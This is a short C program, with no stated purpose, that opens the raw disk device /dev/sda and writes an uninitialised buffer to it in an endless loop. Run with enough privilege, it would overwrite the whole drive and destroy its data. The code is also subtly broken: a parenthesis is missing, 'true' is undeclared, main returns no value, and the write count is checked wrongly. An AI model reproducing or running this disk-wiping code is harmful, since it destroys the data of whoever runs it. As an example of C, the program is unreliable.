#include <stdio.h>
int main() {
    char buf[8192];
    FILE *f = fopen("/dev/sda", "w");
    if(f == NULL) {
       perror("Could not open file for writing");
       return;
    }

    long unsigned int written = 0;

    while(true) {
        unsigned count = fwrite(buf, sizeof(buf), 1, f);
        written += count;
        if(count != sizeof(buf) {
            perror("Could not write file");
            break;
        }; 
    }

    fclose(f);

    printf("Bytes written: %lu\n", written);
}
